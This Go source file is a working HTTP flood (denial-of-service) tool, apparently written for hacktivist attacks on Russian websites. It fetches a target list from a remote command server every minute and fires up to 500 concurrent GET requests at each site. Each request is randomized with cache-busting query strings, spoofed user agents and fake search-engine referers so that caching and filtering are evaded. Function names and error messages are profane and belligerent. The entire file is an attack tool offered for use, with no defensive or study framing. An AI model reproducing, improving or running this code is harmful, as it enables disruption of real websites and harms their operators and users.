package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync/atomic"
	"time"

	tm "github.com/buger/goterm"
	ua "github.com/wux1an/fake-useragent"
)

type strikeItem struct {
	Id           int         `json:"id"`
	Url          string      `json:"url"`
	Page         string      `json:"page"`
	Atack        interface{} `json:"atack"`
	NeedParseUrl int         `json:"need_parse_url"`
	PageTime     interface{} `json:"page_time"`
	Protocol     string      `json:"protocol"`
	Port         interface{} `json:"port"`
}

func (si *strikeItem) PagePayload() string {
	var paramJoiner string
	if strings.ContainsRune(si.Page, '?') {
		paramJoiner = "&"
	} else {
		paramJoiner = "?"
	}

	return fmt.Sprintf("%s%s%s=%s", si.Page, paramJoiner, buildblock(rand.Intn(7)+3), buildblock(rand.Intn(7)+3))
}

type statistics map[string]*statItem

type statItem struct {
	failCnt   int32
	succCnt   int32
	startTime time.Time
}

const (
	strikeUrl             = "https://hutin-puy.nadom.app/sites.json"
	strikeRefreshInterval = 60 * time.Second
	acceptCharset         = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
	maxProcs              = 500

	// strikeRefreshing uint8 = iota
	// strikeListReady
	// strikeListProcessing
)

var (
	strikeList                 []strikeItem
	statData                   statistics
	limiter, refresher         chan struct{}
	noProxyClient, proxyClient *http.Client

	headersReferers []string = []string{
		"http://www.google.com/?q=",
		"http://www.usatoday.com/search/results?q=",
		"http://engadget.search.aol.com/search?q=",
		"http://www.google.ru/?hl=ru&q=",
		"http://yandex.ru/yandsearch?text=",
	}
)

func main() {
	initClients()

	limiter = make(chan struct{}, maxProcs)
	refresher = make(chan struct{}, 1)
	statData = statistics{}

	startStrikeListRefresher()
	time.Sleep(time.Second) // NOTE: give a chance to fetch sites list
	ua.Random()             // NOTE: init cache at this point. bug noticed below...

	startStatsPrinter(&statData, &strikeList)

	for {
		time.Sleep(100 * time.Millisecond)
		refresher <- struct{}{}

		go func() {
			defer func() { <-refresher }()

			// fmt.Printf(" -> strikeList: %d\n", len(strikeList))
			for _, strike := range strikeList {
				limiter <- struct{}{}

				var (
					site *statItem
					ok   bool
				)

				if site, ok = statData[strike.Url]; !ok {
					site = &statItem{startTime: time.Now()}
					statData[strike.Url] = site
				}

				go func(huilo strikeItem) {
					defer func() { <-limiter }()
					if err := greetingsTorussiaWarShip(huilo); err != nil {
						atomic.AddInt32(&site.failCnt, 1)
					} else {
						atomic.AddInt32(&site.succCnt, 1)
					}
				}(strike)

			}
		}()
	}
}

func fetchStrikeList() error {
	refresher <- struct{}{}
	defer func() { <-refresher }()

	var (
		body []byte
		resp *http.Response
		req  *http.Request
		err  error
	)

	req, err = http.NewRequest(http.MethodGet, strikeUrl, nil)
	if err != nil {
		fmt.Printf("failed to create new Request for Strike List: %v\n", err)
	}

	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Accept-Charset", acceptCharset)
	req.Header.Set("Accept", "text/json, application/json")

	resp, err = noProxyClient.Do(req)
	if err != nil {
		fmt.Printf("failed to execute strike List update request: %v\n", err)
	}
	defer resp.Body.Close()

	body, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read strike List body: %v, %d", err, resp.StatusCode)
	}

	if err = json.Unmarshal(body, &strikeList); err != nil {
		return fmt.Errorf("failed to parse json of strike list: %v", err)
	}

	// time.Sleep(200 * time.Microsecond)
	// fmt.Println("***\t\t\t\t***")
	// fmt.Printf("* * fetched sites:\t%d\t* *\n", len(strikeList))
	// fmt.Println("***\t\t\t\t***")

	var idx = 0
	for _, strike := range strikeList {
		atack, ok := strike.Atack.(bool)
		if !ok {
			if atack, ok := strike.Atack.(int); !ok || atack == 0 {
				continue
			}

		} else if !atack {
			continue
		}

		strikeList[idx] = strike
		idx++
	}
	strikeList = strikeList[:idx]
	// fmt.Printf("* * filtered sites:\t%d\t* *\n", len(strikeList))
	// fmt.Println("***\t\t\t\t***")

	return err
}

func startStrikeListRefresher() {
	ticker := time.NewTicker(500 * time.Millisecond)

	go func() {
		for {
			select {
			case <-ticker.C:
				ticker.Stop()
				if err := fetchStrikeList(); err != nil {
					fmt.Println("failed to fetch site List. retrying...")
					fmt.Println(err.Error())

					ticker.Reset(time.Second)
					continue
				}
				ticker.Reset(strikeRefreshInterval)
			}
		}
	}()
}

func startStatsPrinter(stat *statistics, strikes *[]strikeItem) {
	ticker := time.NewTicker(4 * time.Second)

	go func() {
		for {
			select {
			case <-ticker.C:
				stats := tm.NewTable(1, 8, 4, ' ', 0)
				// tm.MoveCursor(1, 1)
				ct := time.Now()
				fmt.Fprintf(stats, "Current Time: %s\n", ct.Format(time.RFC1123))
				fmt.Fprintf(stats, "#\tURL\tSUCC\tFAIL\tDUR\n")
				for i, strike := range *strikes {
					site := (*stat)[strike.Url]
					fmt.Fprintf(stats, "%d\t%s\t%d\t%d\t%v\n", i+1, strike.Url, atomic.LoadInt32(&site.succCnt), atomic.LoadInt32(&site.failCnt), ct.Sub(site.startTime))
				}
				tm.Clear()
				tm.Println(stats)
				tm.Flush()
			}
		}
	}()
}

func greetingsTorussiaWarShip(huilo strikeItem) error {
	req, err := http.NewRequest(http.MethodGet, huilo.PagePayload(), nil)
	if err != nil {
		fmt.Printf("couldn't create new request: %v\n", err)
		return err
	}

	req.Header.Set("User-Agent", ua.Random()) // FIXME: it sometimes panics. see another package?
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Accept-Charset", acceptCharset)
	req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
	req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Host", huilo.Url)

	// fmt.Printf("attacking %s\n", huilo.Url)

	resp, err := proxyClient.Do(req)
	if err != nil {
		return fmt.Errorf("failed to fuck ship: %v\n", err)
	}
	defer resp.Body.Close()

	// NOTE: do not fetch actual body but reflect on connection instead
	// _, err = ioutil.ReadAll(resp.Body)
	// if err != nil {
	// 	return fmt.Errorf("failed to read ship: %v, %d", err, resp.StatusCode)
	// }

	return nil
}

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}

func initClients() {
	tr := http.DefaultTransport.(*http.Transport).Clone()
	tr.Proxy = nil
	noProxyClient = &http.Client{Transport: tr}

	tr2 := http.DefaultTransport.(*http.Transport).Clone()
	tr2.IdleConnTimeout = 4 * time.Second
	tr2.DialContext = (&net.Dialer{
		Timeout:   2 * time.Second,
		KeepAlive: 5 * time.Second,
	}).DialContext
	proxyClient = &http.Client{Transport: tr2}
}
